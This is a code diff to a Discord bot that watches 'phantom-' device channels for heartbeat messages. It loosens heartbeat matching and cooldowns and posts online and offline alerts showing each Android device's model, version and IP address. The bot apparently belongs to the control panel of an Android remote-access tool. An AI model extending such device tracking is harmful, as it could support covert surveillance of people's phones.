@@ -1160,7 +1160,15 @@ async function refreshDeviceStatus(guild, sendAlerts = false) {
           const msgs = await ch.messages.fetch({ limit: 25 })
           for (const [, m] of msgs) {
             if (!m.content) continue
-            const isHeartbeat = m.content.includes('🟢') || m.content.includes(':heartbeat:') || /<:heartbeat:\d+>/.test(m.content) || m.content.includes(':green_circle:') || /<:green_circle:\d+>/.test(m.content)
+            const isHeartbeat = m.content.includes(':heartbeat:') ||
+              m.content.includes(':green_circle:') ||
+              m.content.includes('🟢') ||
+              /<:heartbeat:\d+>/.test(m.content) ||
+              /<:green_circle:\d+>/.test(m.content) ||
+              /<a?:green_circle:\d+>/.test(m.content) ||
+              m.content.includes('**Alive**') ||
+              m.content.includes('**Device Online**') ||
+              m.content.includes('**Reconnected**')
             if (isHeartbeat && Date.now() - m.createdTimestamp < HEARTBEAT_TIMEOUT) {
               online = true; lastSeen = m.createdTimestamp; break
             }
@@ -1176,31 +1184,41 @@ async function refreshDeviceStatus(guild, sendAlerts = false) {
         if (!alertCh || wasOnline === online) return
         const cooldownKey = `${ch.id}:${online}`
         const lastAlert = alertCooldown.get(cooldownKey) || 0
-        if (Date.now() - lastAlert < 300000) return
-        if (Date.now() - botStartTime < 60000) return
+        if (Date.now() - lastAlert < 120000) return
+        if (Date.now() - botStartTime < 30000) return
         alertCooldown.set(cooldownKey, Date.now())
         let mModel = ch.name.replace('phantom-', ''), mAndroid = '?', mIp = '?'
         try {
           const msgs = await ch.messages.fetch({ limit: 25 })
           for (const [, m] of msgs) {
             if (!m.content) continue
-            const om = m.content.match(/\*\*Device Online\*\* — (.+?) \((.+?)\) \| IP: (.+)/)
-            if (om) { mModel = om[1]; mAndroid = om[2]; mIp = om[3]; break }
-            const hm = m.content.match(/\*\*Alive\*\* — (.+?) \| IP: (.+)/)
-            if (hm) { mModel = hm[1]; mIp = hm[2]; break }
+            const om = m.content.match(/\*\*Device Online\*\*.*?—\s*(.+?)\s*\((.+?)\)\s*\|?\s*IP:\s*(.+)/)
+            if (om) { mModel = om[1].trim(); mAndroid = om[2].trim(); mIp = om[3].trim(); break }
+            const rm = m.content.match(/\*\*Reconnected\*\*.*?—\s*(.+?)\s*\|?\s*IP:\s*(.+)/)
+            if (rm) { mModel = rm[1].trim(); mIp = rm[2].trim(); break }
+            const hm = m.content.match(/\*\*Alive\*\*.*?—\s*(.+?)\s*\|?\s*IP:\s*(.+)/)
+            if (hm) { mModel = hm[1].trim(); mIp = hm[2].trim(); break }
           }
         } catch (_) {}
-        const e = new EmbedBuilder()
+
         const deviceName = ch.name.replace('phantom-', '')
-        const cardBuffer = await statusCard({
-          deviceName, status: online ? 'online' : 'offline',
-          model: mModel !== '?' ? mModel : 'Unknown',
-          android: mAndroid !== '?' ? mAndroid : 'Unknown',
-          ip: mIp !== '?' ? mIp : 'Unknown',
-          lastSeen: online ? 'now' : (lastSeen ? `${Math.round((Date.now() - lastSeen) / 60000)}m ago` : 'never'),
-          theme: 'blood'
-        })
-        const attachment = new AttachmentBuilder(cardBuffer, { name: `status-${deviceName}.png` })
+        let cardBuffer = null
+        try {
+          cardBuffer = await statusCard({
+            deviceName, status: online ? 'online' : 'offline',
+            model: mModel !== '?' ? mModel : 'Unknown',
+            android: mAndroid !== '?' ? mAndroid : 'Unknown',
+            ip: mIp !== '?' ? mIp : 'Unknown',
+            lastSeen: online ? 'now' : (lastSeen ? `${Math.round((Date.now() - lastSeen) / 60000)}m ago` : 'never'),
+            theme: 'blood'
+          })
+        } catch (e) {
+          console.error(`[Alert] statusCard failed for ${deviceName}: ${e.message}`)
+        }
+
+        const e = new EmbedBuilder()
+        const thumbUrl = randGif() || undefined
+
         if (!online) {
           const ago = lastSeen ? `${Math.round((Date.now() - lastSeen) / 60000)}m ago` : 'never'
           const fields = [
@@ -1213,27 +1231,39 @@ async function refreshDeviceStatus(guild, sendAlerts = false) {
           ]
           e.setColor(C.void)
             .setTitle(`${E.coffin} ${ch.name} EXSANGUINATED ${E.coffin}`)
-            .setThumbnail(randGif())
-            .setImage(`attachment://status-${deviceName}.png`)
             .addFields(fields)
             .setFooter({ text: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, iconURL: ICONS.alert || undefined })
-        await alertCh.send({ embeds: [e], files: [attachment], components: ALERT_BTNS_OFFLINE(ch.id) }).catch(err => console.error('Alert send (offline):', err.message))
-      } else {
-        const fields = [
-          { name: `${E.target} Device`, value: `\`${ch.name}\``, inline: true },
-          { name: `${E.brain} Model`, value: mModel !== '?' ? mModel : 'Unknown', inline: true },
-          { name: `${E.bone} Android`, value: mAndroid !== '?' ? mAndroid : 'Unknown', inline: true },
-          { name: `${E.eye} IP Address`, value: mIp !== '?' ? `\`${mIp}\`` : 'Unknown', inline: true },
-          { name: `${E.heart} Status`, value: `${E.chain} **ONLINE**`, inline: true },
-          { name: `${E.zap} Connected`, value: ts(), inline: true },
-        ]
-        e.setColor(C.neon)
-          .setTitle(`${E.chain} ${ch.name} REANIMATED ${E.chain}`)
-          .setThumbnail(randGif())
-          .setImage(`attachment://status-${deviceName}.png`)
-          .addFields(fields)
-          .setFooter({ text: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, iconURL: ICONS.correct || undefined })
-          await alertCh.send({ embeds: [e], files: [attachment], components: ALERT_BTNS_ONLINE(ch.id) }).catch(err => console.error('Alert send (online):', err.message))
+
+          if (thumbUrl) e.setThumbnail(thumbUrl)
+          if (cardBuffer) {
+            const attachment = new AttachmentBuilder(cardBuffer, { name: `status-${deviceName}.png` })
+            e.setImage(`attachment://status-${deviceName}.png`)
+            await alertCh.send({ embeds: [e], files: [attachment], components: ALERT_BTNS_OFFLINE(ch.id) }).catch(err => console.error('Alert send (offline):', err.message))
+          } else {
+            await alertCh.send({ embeds: [e], components: ALERT_BTNS_OFFLINE(ch.id) }).catch(err => console.error('Alert send (offline):', err.message))
+          }
+        } else {
+          const fields = [
+            { name: `${E.target} Device`, value: `\`${ch.name}\``, inline: true },
+            { name: `${E.brain} Model`, value: mModel !== '?' ? mModel : 'Unknown', inline: true },
+            { name: `${E.bone} Android`, value: mAndroid !== '?' ? mAndroid : 'Unknown', inline: true },
+            { name: `${E.eye} IP Address`, value: mIp !== '?' ? `\`${mIp}\`` : 'Unknown', inline: true },
+            { name: `${E.heart} Status`, value: `${E.check} **ONLINE**`, inline: true },
+            { name: `${E.zap} Connected`, value: ts(), inline: true },
+          ]
+          e.setColor(C.neon)
+            .setTitle(`${E.check} ${ch.name} REANIMATED ${E.check}`)
+            .addFields(fields)
+            .setFooter({ text: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, iconURL: ICONS.correct || undefined })
+
+          if (thumbUrl) e.setThumbnail(thumbUrl)
+          if (cardBuffer) {
+            const attachment = new AttachmentBuilder(cardBuffer, { name: `status-${deviceName}.png` })
+            e.setImage(`attachment://status-${deviceName}.png`)
+            await alertCh.send({ embeds: [e], files: [attachment], components: ALERT_BTNS_ONLINE(ch.id) }).catch(err => console.error('Alert send (online):', err.message))
+          } else {
+            await alertCh.send({ embeds: [e], components: ALERT_BTNS_ONLINE(ch.id) }).catch(err => console.error('Alert send (online):', err.message))
+          }
         }
       } finally {
         deviceCheckLocks.delete(ch.id)
